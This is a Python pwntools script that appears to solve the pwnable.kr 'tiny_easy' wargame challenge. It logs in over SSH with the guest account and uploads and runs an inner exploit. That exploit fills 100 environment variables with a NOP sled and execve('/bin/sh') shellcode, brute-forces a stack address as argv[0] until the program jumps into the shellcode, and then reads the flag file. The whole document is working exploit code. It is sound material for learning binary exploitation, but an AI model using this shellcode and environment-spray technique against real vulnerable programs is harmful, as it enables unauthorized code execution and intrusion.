from pwn import *

pwnfile = r"""
from pwn import *

payload = "\x90" * 0x1000 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
env = {}
[env.update({str(i): payload}) for i in range(0, 100)]
while True:
    try:
        sh = process(argv=[p32(0xff9c3844)], executable="/home/tiny_easy/tiny_easy", env=env)
        sh.sendline("cat /home/tiny_easy/flag")
        print sh.recvline()
        break
    except EOFError:
        continue
"""

con = ssh("tiny_easy", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/leo4")
con.upload_data(pwnfile, "/tmp/leo4/pwnfile.py")
sh = con.run('python -i "/tmp/leo4/pwnfile.py"')
print sh.recvuntil(">>>")

# What a tiny task :) good job!
